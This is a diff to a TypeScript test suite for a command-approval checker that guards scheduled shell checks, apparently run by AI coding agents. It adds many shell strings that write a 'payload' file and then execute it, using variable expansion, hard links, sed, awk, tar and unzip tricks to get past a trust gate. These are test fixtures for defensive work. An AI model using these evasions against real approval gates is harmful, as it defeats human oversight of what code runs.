@@ -10,7 +10,7 @@ import path from 'node:path';
 import { execFileSync } from 'node:child_process';
 import { makeHarness, tick, tmpDir } from '../helpers/fakes.ts';
 import { loadPatchSet } from '../../src/patches.ts';
-import { checkDigest, checkReach, PatchTrust, patchHash, type PatchGate } from '../../src/patch-trust.ts';
+import { CHECK_PREFIX, checkDigest, checkReach, folderKeyOfDir, PatchTrust, patchHash, type PatchGate } from '../../src/patch-trust.ts';
 import { claudeCommands } from '../../src/claude-trust.ts';
 import { Scheduler, scheduleMethods } from '../../src/schedules.ts';
 import { nullLogger } from '../../src/log.ts';
@@ -858,14 +858,48 @@ test('schedule check: one that writes a file it then runs is unfollowable, so a 
     'out=of=run.sh; dd if=payload.dat "$out"; sh run.sh',
     'curl -sorun.sh "file://$PWD/payload.dat"; sh run.sh',
     "awk '{ print $0 \";\" > \"run.sh\" }' payload.dat; sh run.sh",
+    // Gemini's review, and Codex's second.
+    'cp payload.dat "${UNSET_VAR}run.sh"; sh run.sh',
+    'cat payload.dat > "${UNSET_VAR:+ignored}run.sh"; sh run.sh',
+    'cp payload.dat ${UNSET_VAR:-"run.sh"}; sh run.sh',
+    'true; cp payload.dat "run$?.sh"; sh run0.sh',
+    "env 'X=1' cp payload.dat run.sh; sh run.sh",
+    'cp payload.dat /tmp/tb-153-x.sh; . /tmp/tb-153-x.sh',
+    'cp payload.dat foo.mk; make -f foo.mk',
+    'go() { sh new.sh; }; cp payload.dat new.sh; go',
+    '[ -f new.sh ] && sh new.sh; cp payload.dat new.sh; sh new.sh',
+    "sed -n 'w run.sh' payload.dat; sh run.sh",
+    'sed -i.sh s/x/x/ payload.dat; sh payload.dat.sh',
+    'tar -xf./payload.tar; sh run.sh',
+    'tar -xfpayload.tar; sh run.sh',
+    "printf '%s\\n' checkout -- run.sh | xargs git; sh run.sh",
+    'rsync payload.dat run.sh --log-file /tmp/x.log; sh run.sh',
+    'f=$(echo run.sh); curl --output="$f" https://example.com; sh run.sh',
+    "awk '/\"/ || 1 { print $0 > \"run.sh\" }' payload.dat; sh run.sh",
+    "awk '{ print ($0 ~ /;/ ? $0 : $0) > \"run.sh\" }' payload.dat; sh run.sh",
+    'set -- run.sh; cat payload.dat > "$1"; sh run.sh',
+    'sh writer.sh run.sh; sh run.sh',
+    'write() { cat payload.dat > "$1"; }; write "$(cat target.txt)"; sh run.sh',
+    "dest=backup.dat; export 'dest=run.sh'; cat payload.dat > \"$dest\"; sh run.sh",
+    'unset dest; : "${dest:=run.sh}"; cat payload.dat > "$dest"; sh run.sh',
+    'dest=; cat payload.dat > "${dest:-run.sh}"; sh run.sh',
+    'unset dest suffix; cat payload.dat > "${dest:-run}${suffix}.sh"; sh run.sh',
+    "dest='run.?h'; cp payload.dat $dest; sh run.sh",
+    'tee run.{s"h",bak} < payload.dat >/dev/null; sh run.sh',
+    'unzip -oq -dout payload.zip; sh run.sh',
+    'cat payload.dat > alias.dat; sh run.sh',
   ];
-  const dir = repo({ ...files, 'payload-dir/env.sh': 'X=2\n', 'target.txt': 'run.sh\n' });
+  const dir = repo({ ...files, 'payload-dir/env.sh': 'X=2\n', 'target.txt': 'run.sh\n', 'writer.sh': 'cat payload.dat > "$1"\n' });
+  // A link made before the check: the same file by another name.
+  fs.linkSync(path.join(dir, 'run.sh'), path.join(dir, 'alias.dat'));
   // Data, as the finding has it: not runnable, so never hashed by itself.
   fs.chmodSync(path.join(dir, 'payload.dat'), 0o644);
   for (const check of writes) {
     assert.match(checkDigest(check, dir).problem ?? '', /writes/, check);
     assert.match(checkReach(check, dir).problem ?? '', /writes/, `${check}: edits ask too`);
   }
+  // awk's program from a file, run on: refused as one it can't follow.
+  assert.match(checkDigest('awk -fpayload.dat /dev/null', dir).problem ?? '', /awk program from a file/);
   // The finding's attack, played: a payload-only change after approval.
   // The payload isn't in the digest, so before this it stayed the same and
   // the shell ran the payload; now the check can't be approved at all.
@@ -880,7 +914,7 @@ test('schedule check: one that writes a file it then runs is unfollowable, so a 
 });
 
 test('schedule check: writing files it never runs stays followable: state files, logs, temp files, /dev/null', () => {
-  const dir = repo({ 'run.sh': '#!/bin/sh\necho hi\n', 'payload.dat': 'x\n' });
+  const dir = repo({ 'run.sh': '#!/bin/sh\necho hi\n', 'payload.dat': 'x\n', 'writer.sh': 'cat payload.dat > "$OUT"\n' });
   for (const check of [
     './run.sh > out.log 2>&1',
     './run.sh >/dev/null 2>&1; echo done >&2',
@@ -892,6 +926,11 @@ test('schedule check: writing files it never runs stays followable: state files,
     'git pull -q',
     'git stash list; git worktree list; git reset -q; ./run.sh',
     'gzip -dc data.gz > state.txt; unzip -p data.zip > s2.txt; ./run.sh',
+    'unzip -c data.zip > state.txt; gunzip -t data.gz; git reset -q HEAD -- README.md; ./run.sh',
+    "awk '{ print ($1 > 0) }' numbers.dat; ./run.sh",
+    "awk 'NR > 1 && /^#/ { sub(/^# ?/, \"\"); print; next } NR > 1 { exit }' notes.txt; ./run.sh",
+    'tar -cf out.tar extra; tar -tzf index.tgz; ./run.sh',
+    'export OUT=state.txt; sh writer.sh; ./run.sh',
   ]) assert.equal(checkDigest(check, dir).problem, undefined, check);
   // A variable the check sets is an outside script's to write to too.
   fs.chmodSync(path.join(dir, 'payload.dat'), 0o644);
@@ -907,11 +946,21 @@ test('schedule check: writing files it never runs stays followable: state files,
 // none runs on an approval it somehow has.
 test("schedule check: one that writes what it runs can't be approved by the owner or a Full thread either, the file there or not", async () => {
   const dir = repo({ 'payload.dat': 'echo safe\n', 'run.sh': '#!/bin/sh\necho old\n', 'check.py': 'print(1)\n' });
+  fs.linkSync(path.join(dir, 'run.sh'), path.join(dir, 'alias.dat'));
   const trust = new PatchTrust({ file: path.join(tmpDir(), 'patch-trust.json') });
-  for (const check of ['cp payload.dat run.sh; sh run.sh', 'cp payload.dat new.sh; sh new.sh', 'git pull -q && ./run.sh']) {
+  for (const check of ['cp payload.dat run.sh; sh run.sh', 'cp payload.dat new.sh; sh new.sh', 'cat payload.dat > alias.dat; sh run.sh']) {
     assert.throws(() => trust.approveCheck(check, dir), /writes a file it then runs/, check);
     assert.equal(trust.checkApproved(check, dir).approved, false, check);
   }
+  // One approved before this fix, its digest somehow the same, still doesn't run.
+  const hash = checkDigest('cp payload.dat run.sh; sh run.sh', dir).hash;
+  (trust as unknown as { add(key: string, entries: string[]): void }).add(folderKeyOfDir(dir), [CHECK_PREFIX + hash]);
+  assert.equal(trust.checkApproved('cp payload.dat run.sh; sh run.sh', dir).approved, false);
+  // One that writes somewhere it can't tell (`git pull`, `tar -x`) is one it
+  // can't follow, as `python3 x.py` is: the owner's to approve, bound as far
+  // as it can be (SECURITY.md); a thread that asks first can't.
+  assert.match(checkDigest('git pull -q && ./run.sh', dir).problem ?? '', /writes files where/);
+  assert.equal(checkDigest('git pull -q && ./run.sh', dir).writes, undefined);
   // Other checks it can't follow are still the owner's to approve, as before.
   trust.approveCheck(`python3 ${dir}/check.py`, dir);
   assert.equal(trust.checkApproved(`python3 ${dir}/check.py`, dir).approved, true);
